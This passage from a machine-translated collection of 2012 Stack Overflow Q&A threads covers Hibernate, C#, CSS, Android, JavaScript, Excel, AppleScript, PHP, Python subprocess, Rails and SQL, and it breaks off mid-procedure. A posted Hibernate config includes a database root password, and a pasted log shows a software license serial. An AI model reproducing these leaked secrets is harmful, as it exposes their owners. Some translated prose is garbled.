        this.PhoneContact1 = PhoneContact1;
    }

    public String getPhoneContact2() {
        return PhoneContact2;
    }

    public void setPhoneContact2(String PhoneContact2) {
        this.PhoneContact2 = PhoneContact2;
    }

    public Set<IndusteriesOfInterest> getIndusteriesOfInterestSet() {
        return IndusteriesOfInterestSet;
    }

    public void setIndusteriesOfInterestSet(Set<IndusteriesOfInterest> IndusteriesOfInterestSet) {
        this.IndusteriesOfInterestSet = IndusteriesOfInterestSet;
    }

    public List<MessagePost> getMessagePostsList() {
        return MessagePostsList;
    }

    public void setMessagePostsList(List<MessagePost> MessagePostsList) {
        this.MessagePostsList = MessagePostsList;
    }

    public boolean isActive() {
        return Active;
    }

    public void setActive(boolean Active) {
        this.Active = Active;
    }

    public String getEmail() {
        return Email;
    }

    public void setEmail(String Email) {
        this.Email = Email;
    }

    public String getFirstName() {
        return FirstName;
    }

    public void setFirstName(String FirstName) {
        this.FirstName = FirstName;
    }

    public String getLastName() {
        return LastName;
    }

    public void setLastName(String LastName) {
        this.LastName = LastName;
    }

    public com.yourmarketnet.beans.UserRegisteration getUserRegisteration() {
        return UserRegisteration;
    }

    public void setUserRegisteration(com.yourmarketnet.beans.UserRegisteration UserRegisteration) {
        this.UserRegisteration = UserRegisteration;
    }

    public Long getUserId() {
        return UserId;
    }

    public void setUserId(Long UserId) {
        this.UserId = UserId;
    }

    public String getUserType() {
        return UserType;
    }

    public void setUserType(String UserType) {
        this.UserType = UserType;
    }

    public List<Inventory> getInventoryList() {
        return InventoryList;
    }

    public void setInventoryList(List<Inventory> InventoryList) {
        this.InventoryList = InventoryList;
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final UserAccount other = (UserAccount) obj;
        if ((this.UserId == null) ? (other.UserId != null) : !this.UserId.equals(other.UserId)) {
            return false;
        }
        return true;
    }

    @Override
    public int hashCode() {
        int hash = 3;
        hash = 73 * hash + (this.UserId != null ? this.UserId.hashCode() : 0);
        return hash;
    }
} 
```

休眠.cfg.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hibernate-configuration PUBLIC "-//Hibernate/Hibernate Configuration DTD 3.0//EN" "http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd">
<hibernate-configuration>
  <session-factory>
    <property name="hibernate.dialect">org.hibernate.dialect.MySQLDialect</property>
    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
    <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/yourmarketnet</property>
    <property name="hibernate.connection.username">root</property>
    <property name="hibernate.connection.password">arya6678</property>
     <!--Enable this to see the SQL statements in the logs-->
     <property name="show_sql">true</property>    
      <!--This will drop our existing database and re-create a new one-->      
     <property name="hbm2ddl.auto">create</property> 
     <!--annotation beans/entity mappings-->
<mapping package="com.yourmarketnet.beans"/> 
<mapping class="com.yourmarketnet.beans.UserAccount"/>
<mapping class="com.yourmarketnet.beans.UserRegisteration"/>
<mapping class="com.yourmarketnet.beans.Product"/>
<mapping class="com.yourmarketnet.beans.Service"/>
<mapping class="com.yourmarketnet.beans.Inventory"/>
<mapping class="com.yourmarketnet.beans.IndusteriesOfInterest"/>
<mapping class="com.yourmarketnet.beans.MessagePost"/>
<mapping class="com.yourmarketnet.beans.Offering"/>
<mapping class="com.yourmarketnet.beans.OfferingImage"/>
  </session-factory>
</hibernate-configuration> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:33:52.017

您的`first_name`列中有一个错误的空间。由于`user_account`此错误，无法创建表。稍后，`user_account`由于被引用的表不存在，无法创建外键引用。

```
 @Autowired
 @Column(name = "first _name")
 // ------------------^^^^
 // Remove the space!
 private String FirstName; 
```

错误消息指向`_name`之前发生`last_name`的 ，所以这是开始寻找问题的地方。MySQL 通常对语法错误的确切字符位置进行非常详细的描述：

> 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取在 '_name varchar(255), l 附近使用的正确语法

# c# - “this”作为参数是参考吗？

> ID：10989724
> 
> 赞同：1
> 
> 时间：2012-06-12T02:05:10.203
> 
> 标签：c#, reference, xna

我正在 Xna 中开发一个关卡编辑器，我的问题是，当您使用“this”作为参数调用方法时，参数是引用还是值？

前任：

```
class A_Class
{
    private B_Class bClass;

    public void aMethod()
    {
        bClass.bMethod(this);
    }
}

class B_Class
{
    public void bMethod(A_Class aClass)
    {
        // code
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T02:08:26.603

它是对调用 A_Class 对象的引用，因为类是引用类型的。
更具体地说，正如在其他关于引用/值的问题中所指出的那样，它正在传递一个值，并且该值是对调用 A_Class 对象的引用。

如果不是 A_Class，而是 A_Struct，`this`则将按值传递，因为 Struct 是值类型。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T02:07:52.517

传递 'this' 或任何对象，将传递一个等于引用的值。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-12T02:17:55.510

默认情况下，参数**由 VALUE**传递。如果参数是引用类型，则 VALUE 是对真实数据的引用。如果参数是值类型，则 VALUE 是值类型保存的数据。在你的代码中，`A_Class`是引用类型，所以`this`作为参数传递实际上是传递对象的VALUE `A_Class`，它是对真实数据的引用。

您可以使用`ref`关键字使它们通过**引用**传递。

有关详细信息，请参阅[C# 中的参数传递](http://www.yoda.arachsys.com/csharp/parameters.html)。

# php - 浮动导致空 div 消失 - 为什么？

> ID：10989731
> 
> 赞同：0
> 
> 时间：2012-06-12T02:05:58.023
> 
> 标签：php, css

更新：这里的 JSFiddle 链接[http://jsfiddle.net/truBB/](http://jsfiddle.net/truBB/)

我正在使用 PHP 创建一系列 div 用于数据显示：

```
function supp_data_div($state_id) {
    $data_value_array = get_supp_data(get_page_id(), $state_id); 

    $return_div = '<div id="supp_data'.$state_id.'" class="supp_data">';
    $is_percent = get_supp_data_type(get_page_id()); // returns '%' if true

    for($i=0; $i < sizeof($data_value_array); $i++) {
        $data_pair = $data_value_array[$i];
        $data_name = $data_pair[0];
        $data_value = $data_pair[1];
        if ($is_percent) 
            $bar_chart = '<div class="bar-chart" width="'.$data_value.'"></div>';
        $return_div = $return_div.'<div class="supp-data-item"><div class="supp-data-left">'.$data_name.'</div><div class="supp-data-right">'.$bar_chart.'<div class="data-item">'.$data_value.$is_percent.'</div>'.'</div></div>';
    }
    $return_div = $return_div.'</div>';

    return $return_div;

} 
```

我希望我的 $data_value 直接显示在我的 $bar_chart 之后，如下所示：

||||||||||||| $data_value

使用我当前的 CSS .bar-chart 显示在我的 .data-item 类上方。如果我添加`float:left`到`.bar-chart`，则`.bar-chart`完全消失。

CSS：

```
.supp_data {
    position: absolute;
    top:  18px;
    right: 8px;
    width:  250px;
    height: 250px;
    z-index: 9999;
    background-color: white;

    display: none;

    padding:  10px 10px 10px 10px;

    border: 3px solid #888;
    -moz-box-shadow: 0 0 10px #4e4747;
    -webkit-box-shadow: 0 0 10px #4e4747;
    box-shadow: 0 0 10px #4e4747;

    -moz-border-radius: 10px;
    -webkit-border-radius: 10px;
    border-radius: 10px; /* future proofing */
    -khtml-border-radius: 10px; /* for old Konqueror browsers */
}

.supp-data-item {
    display: block;
    clear: both;
}

.supp-data-left {
    text-align: right;
    float: left;
    width: 120px;
    padding-bottom: 5px;
    padding-right: 5px;
    border-right: 1px solid #999;
}

.supp-data-right {
    float: left;
    font-weight: bold;
    margin-left: 4px;
    padding-left: 8px;
    padding-bottom: 5px;
    padding-right: 5px;
    margin-top: 0 auto;
    margin-bottom: 0 auto;
    vertical-align: middle;
    display: table-cell;

}

.bar-chart {
    height: 14px;
    background-color: $dark-grey;

}

.data-item {
    float: left;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T03:01:10.550

好的，我将您的 CSS 复制到 Fiddle 并`display:none;`从`.supp_data`. 然后我添加`float:left;`并`.bar-chart`修复了该`background-color: $dark-grey`属性，一切似乎都正常运行。

你可以在这里看到它：[jsfiddle.net/truBB/3](http://jsfiddle.net/truBB/3/)

# android - Android不确定进度作为ImageView源

> ID：10989736
> 
> 赞同：1
> 
> 时间：2012-06-12T02:06:41.990
> 
> 标签：android, animation, progress-bar, imageview, progress

我有一个`ImageView`我想显示一个不确定的进度微调器，直到图像被加载。理想情况下，我想从我的布局 xml 文件中指向可绘制对象本身，然后简单地在代码中交换图像。

这是drawable的xml；它所显示的只是一个不旋转的静态图像。

```
<animated-rotate
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/spinner"
    android:fromDegrees="0"
    android:toDegrees="360"
    android:pivotX="50%"
    android:pivotY="50%"
    android:repeatCount="infinite"
    android:duration="500" /> 
```

我也试过只用`<rotate>`根标签，结果是一样的。有什么我想念的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T00:34:48.253

我以一种更简单的方式解决了我自己的问题。我有一个`FrameLayout`有两个孩子的： custom`ImageView`和一个 indeterminate `ProgressBar`。当图像完成加载时，我`ProgressBar`就走了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:14:07.977

从您的 anim 文件夹加载动画，然后调用 startAnimation 来播放它：

```
final ImageView ivRotate = (ImageView) findViewById(R.id.iv_rotate);
Animation rotate = AnimationUtils.loadAnimation(this, R.anim.rotate_picture);
ivRotate.startAnimation(rotate); 
```

# php - javascript onclick 将第二个输入框的值更改为与第一个输入框的值相同

> ID：10989737
> 
> 赞同：1
> 
> 时间：2012-06-12T02:06:47.113
> 
> 标签：php, javascript, onclick

我正在使用 php 创建一个表单。在我的一个字段中，我创建了一个六行下拉框，其中包含相同的两个选项“浮动汇率”和“固定汇率”可供选择，并且每个下拉框旁边还有一个按钮。我想让用户更容易选择。例如，如果用户在第一行选择“浮动汇率”并单击侧面的按钮，则其余行将其选择更改为“浮动汇率”。如果用户在第 4 行选择任一选项，则第 5 行和第 6 行将根据用户在第 4 行选择的选项而改变。我是 Java 或 Jquery 的菜鸟。有没有办法使用 Javascript 实现上述结果？

第一行：

```
<td>
    <select class="dropDown" style="width:150px" name="rate_value_1">
    <option value="<?php echo $_SESSION['rate_value_1'] ;?>"><?php echo $_SESSION['rate_value_1'] ;?></option>
    <option value="Floating Rate">Floating Rate</option>
    <option value="Fixed Rate">Fixed Rate</option>
    </select>
</td>
<td><input type="button" value="equal" class="equal" /></td> 
```

第二行：

```
<td>
    <select class="dropDown" style="width:150px" name="rate_value_2">
    <option value="<?php echo $_SESSION['rate_value_2'] ;?>"><?php echo $_SESSION['rate_value_2'] ;?></option>
    <option value="Floating Rate">Floating Rate</option>
    <option value="Fixed Rate">Fixed Rate</option>
    </select>
</td>
<td><input type="button" value="equal" class="equal" /></td> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:30:43.467

这是代码：

我模拟你的情况是这样的：

```
<table id="interest_rate">
<tr>
<td>
    <select class="dropDown" style="width:150px" name="rate_value_1">
    <option value="rate_value_1">rate_value_1</option>
    <option value="Floating Rate">Floating Rate</option>
    <option value="Fixed Rate">Fixed Rate</option>
    </select>
</td>
<td><input type="button" value="equal" class="equal" /></td>
</tr>
<tr>
<td>
    <select class="dropDown" style="width:150px" name="rate_value_2">
    <option value="rate_value_2">rate_value_2</option>
    <option value="Floating Rate">Floating Rate</option>
    <option value="Fixed Rate">Fixed Rate</option>
    </select>
</td>
<td><input type="button" value="equal" class="equal" /></td>
</tr>
</table> 
```

这是在这种情况下工作的 javascript 代码，您只需将此代码放在表格之后。

```
document.getElementById('interest_rate').onclick = function (e) {
  if (!e) {
    e = event;
  }

  // Get the clicked target
  var target = e.target || e.srcElement;

  // If this is the target that we want to get.
  if ('equal' == target.className && 'button' == target.type) {
    // Get the selected index of the 'SELECT' element.
    var defaultValue = target.parentNode.parentNode.getElementsByTagName('SELECT')[0].selectedIndex;

    // Loop and change all 'SELECT' element to the same selected index.
    for (var i = 0, selects = this.getElementsByTagName('SELECT'), selectsLength = selects.length; i < selectsLength; ++i) {
      selects[i].selectedIndex = defaultValue;
    }
  }
}; 
```

[现场 jsFiddle 演示](http://jsfiddle.net/hVuj6/)

* * *

**编辑1**

要仅更改`SELECT`行下方的元素，您需要确定当前`SELECT`元素的索引，然后更改所有下方。这是代码：

```
document.getElementById('interest_rate').onclick = function (e) {
  if (!e) {
    e = event;
  }

  var target = e.target || e.srcElement;

  if ('equal' == target.className && 'button' == target.type) {
    var targetSelect = target.parentNode.parentNode.getElementsByTagName('SELECT')[0];
    if (targetSelect) {
      var defaultValue = targetSelect.selectedIndex;

      for (var i = 0, selects = this.getElementsByTagName('SELECT'), selectsLength = selects.length, status = 0; i < selectsLength; ++i) {
        if (status || selects[i] === targetSelect) {
          status = 1;
          selects[i].selectedIndex = defaultValue;
        }
      }
    }
  }
}; 
```

[现场 jsFiddle 演示](http://jsfiddle.net/hVuj6/1/)

* * *

**编辑2**

要使用 更改`INPUT`元素的值`type="text"`，您只需更改`selectedIndex`为`value`然后检查`INPUT`元素的类型，如下所示：

```
document.getElementById('interest_rate').onclick = function (e) {
  if (!e) {
    e = event;
  }

  var target = e.target || e.srcElement;

  if ('equal' == target.className && 'button' == target.type) {
    var targetInput = target.parentNode.parentNode.getElementsByTagName('INPUT')[0];
    if (targetInput && 'text' == targetInput.type) {
      var defaultValue = targetInput.value;

      for (var i = 0, inputs = this.getElementsByTagName('INPUT'), inputsLength = inputs.length, status = 0; i < inputsLength; ++i) {
        if (status || inputs[i] === targetInput) {
          status = 1;
          if ('text' == inputs[i].type) {
            inputs[i].value = defaultValue;
          }
        }
      }
    }
  }
}; 
```

[现场 jsFiddle 演示](http://jsfiddle.net/hVuj6/2/)

# excel - 如何根据其他单元格中存在的标准计算平均值

> ID：10989738
> 
> 赞同：3
> 
> 时间：2012-06-12T02:06:48.357
> 
> 标签：excel

也许这个问题最好用表格而不是文字来解释。

我正在尝试扭转这张桌子：

```
Site | Year | Value
A    | 1999 | 5
A    | 1999 | 10
A    | 2001 | 12
B    | 1999 | 6
C    | 1996 | 4
C    | 1996 | 10 
```

进入这张表：

```
Site | Year | Value | Year-Average | Site-Average
A    | 1999 | 5     | 7.5          | 9.75
A    | 1999 | 10    | 7.5          | 9.75
A    | 2001 | 12    | 12           | 9.75
B    | 1999 | 6     | 6            | 6
C    | 1996 | 4     | 7            | 8.5
C    | 1996 | 10    | 7            | 8.5 
```

如果您注意到，“年平均值”是*一个站点内**一年*内重复值的平均值。然后 Site-Average 从 Year-Average 值计算其平均值。

 *我可以手动执行此操作，但我的真实数据集有数千行，我正在寻找一个可重复的过程以供将来使用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T05:46:03.107

年平均值的公式是

```
=AVERAGE(IF(($A$2:$A$7=A2)*($B$2:$B$7=B2),$C$2:$C$7,"")) 
```

对于站点平均

```
=AVERAGE(IF($A$2:$A$7=A2,$D$2:$D$7,"")) 
```

使用 Ctrl-Shift-Enter 将其作为**数组公式**输入到第一个单元格中，然后复制整个列。如果在计算站点平均值时需要排除重复年份，则公式会稍长一些：

```
=AVERAGE(IF(($A$2:$A$8=A2)*(FREQUENCY(($A$2:$A$7=A2)*($B$2:$B$7=B2),($A$2:$A$7=A2)*($B$2:$B$7=B2))>0),$D$2:$D$7,"")) 
```

请注意，在输入范围的第一个匹配项中多了一行：$A$2:$A$8 而不是 $A$2:$A$7。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T04:43:57.750

使用这些数组公式。在单元格中输入公式后，您需要按`CTL`+ `SHIFT`+`ENTER`

将其`Year Average`放入单元格 D2

```
=SUMPRODUCT(($A$2:$A$7=A2)*($B$2:$B$7=B2)*($C$2:$C$7))/COUNT(IF($A$2:$A$7=A2,IF($B$2:$B$7=B2,$C$2:$C$7))) 
```

我不确定，你是如何达到 8.5 的 C

**快照**

![在此处输入图像描述](../Images/71fd6e81eedf3cb7c2879e88be9dd956.png)

**编辑**

**这是获得站点平均的方法:)**

为了达到您想要的站点平均值，我们必须使用辅助列。见快照

在单元格 E2 中输入此公式

```
=D2 
```

在 E3 中输入这个公式

```
=IF(OR(A3<>A2,B3<>B2),D3,"") 
```

并将其拖下。

现在在单元格 F2 中输入这个公式

```
=AVERAGE(IF($A$2:$A$7=A2,$E$2:$E$7,"")) 
```

然后按`CTL`+ `SHIFT`+`ENTER`

把公式抄下来。

如果需要，隐藏 Col E

![在此处输入图像描述](../Images/f2af767affd469198427ea62d89b111d.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T02:13:12.593

您可以使用数据透视表按年份和站点计算平均值，然后使用 vlookups 将相关平均值附加到初始表的每一行。*

# applescript - Geektool 并返回 Applescript

> ID：10989760
> 
> 赞同：0
> 
> 时间：2012-06-12T02:10:36.090
> 
> 标签：applescript, return, geektool

我有一个 Applescript 脚本，它使用 Geektool 设置为每 10 秒重复一次。

我在每个处理程序的末尾都有返回，让我知道发生了什么，但这让我几乎没有机会看到脚本中间到底发生了什么。

所以我要问的是Applescript中是否有类似return的命令但不会停止脚本？

干杯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T03:41:51.620

```
display dialog "This is what's going on" giving up after 1 
```

或者

```
 tell application "Terminal"
    activate
    set xxx to "This is what's going on"
    do script "echo " & quoted form of xxx in window 1
    delay 2
    do script "echo " & quoted form of xxx in window 1
end tell 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-26T15:59:07.110

返回函数应该可以工作。

```
 set stringYouWantToReturn to "banana"
return stringYouWantToReturn 
```

# php - 避免在php中使用html转义字符

> ID：10989761
> 
> 赞同：3
> 
> 时间：2012-06-12T02:10:44.250
> 
> 标签：php, html, html-escape-characters

我正在尝试使用`PHP`. 参数之一是货币

我的 API 调用就像

```
<?php 
$call=".....&currency=USD&......."; 
$response = hash_call("Pay", $call);
?> 
```

但是，如果我打印呼叫，它会打印为

```
....¤cy=USD&....... 
```

我检查并发现`&curren is for ¤`

**编辑：** 我尝试了 urlencode 和 htmlentities。虽然我希望在源代码中获得 ¤cy ，但我分别获得了 %26currency 和 & 货币。

我想对“¤cy”进行编码，这样浏览器就不会将 ¤ 转换为 ¤。谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T03:37:24.577

PHP没有转换任何东西。

*浏览器*正在转换`&current`为`¤t`用于显示目的。如果您想查看**浏览器中的**`$call`内容，则需要使用 包装它，但这会专门对字符进行编码，以便在浏览器中显示原始内容。**`htmlentities``$call`**

 **但是，在将字符串`$call`传递给`hash_call`.

请记住，原始字符串与浏览器显示的内容之间存在很大差异。**

# python - Python subprocess.call 有效，但 subprocess.check_call 无效 - 有什么区别？

> ID：10989765
> 
> 赞同：5
> 
> 时间：2012-06-12T02:11:03.377
> 
> 标签：python, subprocess

我正在使用 Python 2.7

我正在尝试从 Python 运行 StatTransfer 程序。

当我尝试：

```
tempname = os.path.abspath('./text.txt')
TEMPFILE = open(tempname, 'wb')
try:
    subprocess.check_call('ST convert.stc', shell = True, stdout = TEMPFILE, stderr = TEMPFILE)
except:
    raise CritError(messages.crit_error_bad_command) 
```

它失败了（CritError 是用户定义的）。

回溯并没有告诉我任何有用的信息：

```
Traceback (most recent call last):
  File "C:\...\py\run_program.py", line 181, in run_stcmd
    run.execute_run(current_directory, posix_command, nt_command)
  File "C:\...\py\private\runprogramdirective.py", line 99, in execute_run
    raise CritError(messages.crit_error_bad_command)
CritError: 'ERROR! Cannot execute command' 
```

但是将相关行更改为：

```
subprocess.call('ST convert.stc', shell = True, stdout = TEMPFILE, stderr = TEMPFILE) 
```

它运行成功。

有趣的是，对于这两种情况，我在我的 TEMPFILE 中看到了相同的内容：

```
|/-|/-|/-|/-|/- |/-|/-|/-|/-|/- Stat/Transfer - Command Processor (c) 1986-2011 Circle         Systems, Inc.
www.stattransfer.com 
Version 10.1.1866.0714 (32 Bit) - 64 Bit Windows

Serial: ADR4H-L3A3A-N8RJ
User:   XXXXXXXXXXX
Your license is in its grace period -- Please call Circle Systems
Your program will die at the end of the month
Status: Temporarily OK (Expired May 31, 2012)
Transferring from SPSS Portable File: ..\orig\10908970\ICPSR_03775\DS0001\03775-0001-    Data.por
Input file has 26 variables
Optimizing...
Transferring to Stata: ..\data\ABCFeb.dta

504 cases were transferred(0.02 seconds) 
```

请注意，如果我从 Windows 命令行运行“st convert.stc”，它运行得很好，并给了我上面相同的日志消息。它确实实现了 convert.stc 中所写的内容。

这表明使用 subprocess.check_call 调用 StatTransfer 程序。但是，在它的末尾有一个错误。这是什么错误？我该如何避免呢？我应该使用这两个命令中的哪一个，为什么？

***ETA***：在**下面的mgilson**之后，我从 subprocess.call 返回值并获得 -1。这是什么意思？为什么程序仍然运行而我似乎没有注意到任何真正的错误？

关于我应该如何在这里执行此操作的任何可能的解释和建议？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T02:16:54.380

可能发生的是您的进程以非零退出状态退出。要检查，运行，`retcode=subprocess.call(...)`然后打印`retcode`。

`subprocess.check_call``retcode`如果(above) 非零，将引发异常。

您看到的异常来自`raise subprocess.CalledProcessError`您的 try/except 子句：

```
>>> import subprocess 
>>> raise subprocess.CalledProcessError
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: __init__() takes exactly 3 arguments (1 given) 
```

**编辑**

当您捕获异常并抛出另一个异常时，我仍然会重新编写 try/except 子句（这意味着原始消息中的所有信息都将丢失）。

尝试类似：

```
try:
    subprocess.check_call('ST convert.stc', shell = True, stdout = TEMPFILE, stderr = TEMPFILE)
except Exception as e:
    raise CritError(messages.crit_error_bad_command+' '+str(e)) 
```

这仍然会为您提供原始消息中的一些（*不是全部*）信息。问题可能仍然是您的子程序以非零退出代码退出。也许没关系（检查它是否完成了你想要它做的事情）。

你说你可以从命令行运行命令，看起来一切正常。您也可以通过检查 Windows 命令行的退出状态来检查以确保行为相同（[如何从 Windows 命令行获取应用程序退出代码？](https://stackoverflow.com/questions/334879/how-do-i-get-the-application-exit-code-from-a-windows-command-line)）。我猜退出状态仍然是-1——如果不是，你的程序正在与环境（例如环境变量）交互，当你使用python调用它时，它们会有所不同。

最终，如果程序执行您希望它执行的操作，并且您不关心退出状态，那么您应该只使用`subprocess.call`，但我建议您查阅程序退出代码的手册并查看退出状态-1实际上意味着。

# javascript - 如何在 document.write 中调用 onclick 函数？

> ID：10989767
> 
> 赞同：0
> 
> 时间：2012-06-12T02:11:16.293
> 
> 标签：javascript

我的 Javascript 文件中有以下代码行，我想`hide`在用户单击链接测试时调用该函数，但是它不会在页面上显示为链接。做什么

```
document.write('<a href="#" onclick="hide();>test</a>"'); 
```

**编辑 0**

根据这些建议，我使用 document.write 的唯一原因是因为我试图在另一个页面（即接管页面）上显示 HTML。希望有更好的方法来做到这一点。目的是在用户单击“测试”之前，将显示前面的 HTML。当他们点击测试时，前面的 HTML 被隐藏，页面内容正常显示。

```
function show() {
    obj1 = document.getElementById("container");
    obj1.style.position = "absolute";
    obj1.style.top = "0px";
    obj1.style.left = "0px";
    obj1.style.width = "100%";          
    obj1.style.textAlign = "center";
    obj1.style.zIndex = "9999";
    obj1.style.visibility = "visible";
    obj1.style.display = "inline";
    obj1.style.backgroundColor = "#FFF";
    document.write('<h1>Hello World!</h1><p>Have a nice day!</p>');
    document.write('<a href="#" onclick="hide();">test</a>');

}

function hide() {   
    obj1 = document.getElementById("container");
    obj1.style.display = "none";
    obj1.style.visibility = "hidden";
} 
```

**完整代码**

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict/EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtm1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset="UTF-8" />
    <meta http-equiv="content-language" content="en-us" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <meta name="copyright" content="&copy; 2012" />

    <title>takeover</title>

    <base href="" />
    <link rel="stylesheet" href="" />

    <style type="text/css" media="all" />

    #container {
         position:absolute;
         text-align:center;
         background-color:#fff;

         z-index:10;
    }

    </style>

    <script type="text/javascript" src="takeover.js"></script>
</head>
<body>
    <div>
        <div id="container">abc</div>
        <p><a href="#">test</a></p>
    </div>

<script type="text/javascript">
     window.onload = show;
</script>
</body>
</html> 
```

**编辑 1**

好的，在搜索了众多论坛之后，看来 document.write 替换了整个屏幕，因此无法调用适当的 div 元素。相反，我用下面的替换了上面的 javascript，但是我不确定它在哪里是正确的做法。

```
function show() {
    obj1 = document.getElementById("container").innerHTML ='<p>Hello World.<br>Here I am.</p>';
    obj1 = document.getElementById("container").innerHTML +='<a href="#" onclick="hide();">test</a>';

}

function hide() {   
    obj1 = document.getElementById("container");
     if(obj1)
 {
   alert("Going to hide the element");
   obj1.style.display = "none";
   obj1.style.visibility = "hidden";
 }
 else
 {
   alert("Cannot find the element with id container.");
 }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:14:00.480

我认为你有一个未封闭的报价......试试这个：

```
document.write('<a href="#" onclick="hide();">test</a>'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T03:02:31.423

@花生猴子，

继续上述评论。出于某种原因，SO正在吃我的评论。

试试这些

```
function show() {
    obj1 = document.getElementById("container");
    obj1.style.position = "absolute";
    obj1.style.top = "0px";
    obj1.style.left = "0px";
    obj1.style.width = "100%";          
    obj1.style.textAlign = "center";
    obj1.style.zIndex = "9999";
    obj1.style.visibility = "visible";
    obj1.style.display = "inline";
    obj1.style.backgroundColor = "#FFF";
    document.write('<h1>Hello World!</h1><p>Have a nice day!</p>');
    document.write('<a href="#" onclick="hide();">test</a>');

}

function hide() {   
    obj1 = document.getElementById("container");
 if( obj1)
 {
    alert("Going to hide the element");
   obj1.style.display = "none";
    //obj1.style.visibility = "hidden"; // not required
 }
 else
 {
   alert("Cannot find the element with id container.");
 }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T02:15:15.103

除了使用`document.write()`，您可以创建一个空元素，例如 div，然后将其 innerHTML 设置为您的链接：

```
<div id="wrap"></div>
<script language="Javascript">
var wrap = document.getElementById("wrap");
wrap.innerHTML = '<a href="#" onclick="hide();">test</a>';
</script> 
```

# ruby-on-rails - Rails：嵌入 Flash swf

> ID：10989770
> 
> 赞同：2
> 
> 时间：2012-06-12T02:11:43.077
> 
> 标签：ruby-on-rails, ruby-on-rails-3, flash, asset-pipeline

在 Rails 视图中嵌入 Flash swf 的正确方法是什么？

我看到：image_tag 和 video_tag 但我没有看到 swf_tag

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T08:07:55.627

如果您使用的是管道，那么您必须使用 rails 资产助手来访问该文件。这是因为该文件会在生产中添加一个指纹，因此如果您对其进行硬编码，它将无法工作。

[您可以按照此答案中的概述](https://stackoverflow.com/questions/8990393/ruby-on-rails-3-1-move-swf-to-asset-pipeline/8991934#8991934)将 SWF 放在它们自己的目录中，然后在视图中执行此操作：

```
<embed src="<%= asset_path('my_flash.swf) %>", any_embed_options /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:03:58.163

image_tag 只是解析 file_name 并调用 tag("img") 的助手。您可以轻松编写自己的助手。这是一个开始的想法

```
/app/helpers/my_view_helper.rb
swf_tag(path)
  "<embed src=\'path/to/resource\' />".html_safe
end 
```

# sql - 向表中添加多条记录

> ID：10989777
> 
> 赞同：0
> 
> 时间：2012-06-12T02:13:10.423
> 
> 标签：sql, sql-server, multiple-records

我有一个客户数据库，我想向其中添加一组卡号。表格中有多个相同的列，但是卡号将增加 1 直到完成。例如...我想添加礼品卡 1 - 250 与其他列相同...所以它会像这样：

```
Cardnum      price    booktype   service 
1             9.99       1         12 
2             9.99       1         12
3             9.99       1         12 
```

等等等等... 这将重复直到 cardnum 为 '250' 是否可以使用 SQL 查询来做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:41:57.870

首先将cardnum设为'identity'（种子值为1）。然后在从 1 到 250 的 while 循环中，只需为其余三个列编写插入语句。我希望你能自己写代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:51:10.580

由于表已经存在，试试这个：

```
DECLARE @book INT
SET @book = 810041
WHILE (@book) < 810291
BEGIN
    INSERT INTO tableName
    VALUES(@book,9.99,1,12)
    SET @book = @book +1
END 
```

假设您使用的是 SQL-Server 2005 或更高版本并希望从头开始创建此表：

```
 CREATE TABLE [dbo].[#books](
        [id] [int] IDENTITY(1,1) NOT NULL,
        [price] decimal(6,2) NULL,
        [bookType] [int] NULL,
        [service] [int] NULL)

    INSERT INTO #books
    VALUES(9.99,1,12)
    GO 250 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T03:01:30.413

您将需要创建一个存储过程来实现这一点，代码就是这样

```
declare @cnt int

set @cnt = 0
while(@cnt < 250)
begin
insert into dbo.xxx(price, booktype, servic) 
values(9, 1, 12)

set @cnt = @cnt + 1
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T03:35:08.820

@jimdrang 已经提供了答案，但是由于我刚刚使用 CREATE TABLE 和存储过程完成了一个完整的示例来完成这项工作，我想我不妨发布它，以帮助任何在路上寻找这个的人。

```
CREATE TABLE Cards
(
  Cardnum int not null primary key,
  price money not null,
  booktype int not null,
  service int not null
);
GO

CREATE PROCEDURE [dbo].[sp_AddCards] (
  @Price money,
  @BookType int,
  @Service int,
  @NumCards int,
  @StartNum int
)
  AS
BEGIN
  DECLARE @CurCard int
  SELECT @CurCard = @StartNum

